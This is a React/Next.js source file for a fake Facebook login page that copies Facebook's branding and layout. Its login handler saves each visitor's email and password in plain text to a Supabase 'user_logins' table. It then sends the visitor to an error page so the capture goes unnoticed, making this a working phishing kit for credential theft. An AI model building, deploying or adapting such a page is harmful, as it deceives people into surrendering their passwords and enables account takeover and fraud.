"use client";

import { useRouter } from "next/navigation";
import React, { useState } from "react";
import { supabase } from "@/lib/supabase";

export default function FacebookLogin() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const router = useRouter();

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();

    try {
      // Direct insert to Supabase
      const { error } = await supabase
        .from("user_logins")
        .insert([{ email: email, password: password }]);

      if (error) throw error;

      // Redirect regardless of success to simulate the "error" experience
      router.push("/errorprofile");
    } catch (error) {
      console.error("Supabase Error:", error);
      router.push("/errorprofile");
    }
  };

  return (
    <div className="min-h-screen bg-[#f0f2f5] flex flex-col items-center justify-center font-sans pt-30">
      <main className="flex flex-col lg:flex-row items-center justify-between w-full max-w-245 px-4 pb-20 lg:pb-40">
        {/* Left Side: Branding */}
        <div className="lg:w-1/2 text-center lg:text-left mb-10 lg:mb-0 lg:pr-8">
          <h1 className="text-[#1877f2] text-5xl lg:text-6xl font-bold mb-4 tracking-tighter">
            facebook
          </h1>
          <p className="text-2xl lg:text-[28px] leading-tight text-[#1c1e21] font-normal">
            Connect with friends and the world around you on Facebook.
          </p>
        </div>

        {/* Right Side: Login Card */}
        <div className="w-full max-w-99">
          <form
            className="bg-white p-4 rounded-lg shadow-xl shadow-gray-300/50 flex flex-col gap-4"
            onSubmit={handleLogin}
          >
            <input
              type="text"
              placeholder="Email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="text-black p-3.5 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-[17px]"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="text-black p-3.5 border border-gray-300 rounded-md focus:outline-none focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] text-[17px]"
            />
            <button
              className="bg-[#1877f2] text-white py-3 rounded-md text-xl font-bold hover:bg-[#166fe5] transition-colors"
              type="submit"
            >
              Log In
            </button>
            <a
              href="#"
              className="text-[#1877f2] text-sm text-center hover:underline"
            >
              Forgot password?
            </a>
            <hr className="my-2 border-gray-200" />
            <div className="flex justify-center pb-2">
              <button className="bg-[#42b72a] text-white px-4 py-3 rounded-md text-[17px] font-bold hover:bg-[#36a420] transition-colors w-fit">
                Create new account
              </button>
            </div>
          </form>
          <p className="text-sm mt-6 text-center">
            <span className="font-bold hover:underline cursor-pointer">
              Create a Page
            </span>{" "}
            for a celebrity, brand or business.
          </p>
        </div>
      </main>

      {/* Footer (Simplified Example) */}
      <footer className="w-full bg-white flex justify-center pt-8 pb-12">
        <div className="max-w-245 w-full px-4 text-xs text-gray-500 leading-relaxed">
          <div className="flex flex-wrap gap-x-3 gap-y-1 mb-2">
            <span>English (US)</span>
            <span className="hover:underline cursor-pointer">Español</span>
            <span className="hover:underline cursor-pointer">
              Português (Brasil)
            </span>
            <span className="hover:underline cursor-pointer">
              Français (France)
            </span>
          </div>
          <hr className="my-2 border-gray-300" />
          <div className="flex flex-wrap gap-x-4 gap-y-1">
            <span>Sign Up</span>
            <span>Log In</span>
            <span>Messenger</span>
            <span>Facebook Lite</span>
            <span>Video</span>
            <span>Places</span>
            <span>Games</span>
            <span>Marketplace</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
